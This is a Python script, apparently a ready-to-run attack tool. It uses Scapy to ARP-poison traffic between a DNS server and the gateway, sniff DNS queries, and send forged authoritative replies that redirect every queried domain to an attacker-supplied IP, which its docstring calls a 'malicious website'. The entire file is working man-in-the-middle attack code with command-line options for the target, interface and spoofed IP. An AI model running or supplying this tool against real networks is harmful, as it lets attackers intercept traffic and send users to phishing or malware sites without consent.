#!/usr/bin/python3
from argparse import ArgumentParser
from time import sleep
from os import getuid
from sys import exit
from psutil import net_if_addrs, LINUX
from threading import Thread, Event
from netifaces import gateways, AF_LINK, AF_INET
from colorama import Fore
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import sniff, sendp, srp1
from scapy.config import conf


NET = {'dns_server': '192.168.33.1', 'timeout': 2}


class DNSpoofing:
    def __init__(self, dns_target, interface, spoofed_ip):
        """
            * Summary: Set the IP of the DNS Server target and its MAC, the Gateway IP and its MAC
            * Params:  
            *          dns_target - IP of the DNS server
            *          interface - interface to perform the MiTM attack
            *          spoofed_ip - The IP of the malicious website to redirecte all users in the network 
            * Returns: None
        """
        self.target = dns_target
        if self.get_mac(dns_target):
            self.target_mac = self.get_mac(dns_target)
        else:
            raise AttributeError(f"DNS Server {dns_target} is unreachable")
        self.interface = interface
        self.interface_mac, self.gateway_ip = self.get_interface_attributes(interface)
        self.gateway_mac = self.get_mac(self.gateway_ip)
        self.spoofed_ip = spoofed_ip
        self.__stop_mitm_attack = Event()
        conf.iface = interface
        conf.verb = 0
        print(Fore.YELLOW + f'Initialized {interface}:')
        print(f'Gateway ({self.gateway_ip}) is at {self.gateway_mac}')
        print(f'Target ({self.target}) is at {self.target_mac}')

        print('-' * 30 + Fore.RESET)

    @staticmethod
    def get_interface_attributes(interface: str):
        """
            params: interface as a string
            return: interface MAC address as string, IP of default gateway as string
        """
        net_cards = [(iface, iface_attrib) for iface, iface_attrib in net_if_addrs().items()]
        gws = gateways()
        for iface, iface_attrib in net_cards:
            if iface == interface:
                try:
                    mac_address = [attrib.address for attrib in iface_attrib if attrib.family == AF_LINK][0]
                except IndexError:
                    mac_address = iface_attrib[0].address

                default_gateway = gws['default'][AF_INET][0]
                return mac_address.replace('-', ':').lower(), default_gateway

    @staticmethod
    def get_mac(target_ip):
        who_has_request = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op="who-has", pdst=target_ip)
        target_mac = srp1(who_has_request, timeout=NET.get('timeout'), verbose=0)
        try:
            return target_mac.getlayer(Ether).src if target_mac.getlayer(Ether) else None
        except AttributeError:
            return None

    def _dns_query(self, packet):
        return packet.haslayer(IP) and packet.getlayer(IP).src == self.target and packet.haslayer(DNS) and packet.haslayer(DNSQR)
    
    def switch_ip(self, packet):
        dns_layer = packet.getlayer(DNS)
        if dns_layer.qdcount > 0:
            domain_name = (dns_layer.qd.getlayer(DNSQR).qname).decode()
            print(Fore.YELLOW + f'Sniffed Query from {self.target} for the domain: {domain_name}')
            spoofed_response = Ether(dst=packet.getlayer(Ether).src) / IP(src=self.gateway_ip ,dst=packet.getlayer(IP).src) \
                / UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / DNS(
                id=packet[DNS].id,  # Use the same DNS ID
                qr=1,
                aa=1,  # Set authoritative answer flag
                qd=packet[DNS].qd,  # Use the same question
                an=DNSRR(rrname=domain_name, rdata=self.spoofed_ip)
            )
            print(Fore.GREEN + f'Spoofing response with {spoofed_response.an.rdata}' + Fore.RESET)
            sendp(spoofed_response)

    def start_mitm(self):
        print(Fore.YELLOW + f"Starting MiTM Attack on DNS Server: {self.target} and Gateway: {self.gateway_ip}. Press Ctrl+C To stop..." + Fore.RESET)
        gateway_is_at = Ether(src=self.interface_mac, dst=self.target_mac) / ARP(op='is-at', psrc=self.gateway_ip, pdst=self.target)
        target_is_at = Ether(src=self.interface_mac, dst=self.gateway_mac) / ARP(op='is-at', psrc=self.target, pdst=self.gateway_ip)
        while not self.__stop_mitm_attack.is_set():
            sendp(gateway_is_at)
            sendp(target_is_at)
            sleep(1)

    def attack(self):
        """ 
            * Summary: Listen for Queries of DNS Server target, send them to the Gateway then switch between the real IPs in the responses to 
            * our chosen IPs. In simple terms - It's a Man In the Middle attack between the DNS server and the gateway.
            
        """
        try:
            mitim_attack = Thread(target=self.start_mitm)
            mitim_attack.start()
            sniff(lfilter=lambda packet: self._dns_query(packet), prn=self.switch_ip)

        except KeyboardInterrupt:
            self.__stop_mitm_attack.set()
            mitim_attack.join()
            self.restore()
            exit(0)

    def restore(self):
        print(Fore.GREEN + '\nRestoring ARP tables...\n')
        gateway_is_at = Ether(src=self.gateway_mac, dst=NET.get('broadcast_mac')) / ARP(op='is-at',psrc=self.gateway_ip, pdst=self.target)
        target_is_at = Ether(src=self.target_mac, dst=NET.get('broadcast_mac')) / ARP(op='is-at', psrc=self.target, pdst=self.gateway_ip)
        sendp(gateway_is_at, count=5)
        sendp(target_is_at, count=5)
        print('ARP Tables restored' + Fore.RESET)


def main():
    if getuid() != 0:
        exit(Fore.RED + 'Run as root!' + Fore.RESET)

    default_interface = 'eth0' if LINUX else 'WiFi'

    arguments = ArgumentParser()
    arguments.add_argument('-t', '--target', help='IP of the DNS server to attack')
    arguments.add_argument('-i', '--iface', default=default_interface, help=f'Interface to use for the attack. Default is {default_interface}')
    arguments.add_argument('-s', '--spoofed_ip', help='The IP to assign in each response of the DNS query')

    arguments = arguments.parse_args()
    
    try:    
        dns_target = arguments.target
        interface = arguments.iface
        spoofed_ip = arguments.spoofed_ip
        attacker = DNSpoofing(dns_target, interface, spoofed_ip)
        attacker.attack()

    except TypeError:
        print(Fore.RED + 'Enter Spoofing IP and DNS server IP')

    except AttributeError:
        print(Fore.RED + f'DNS server {arguments.target} is unreachable')

    print(Fore.RESET)


if __name__ == '__main__':
    main()
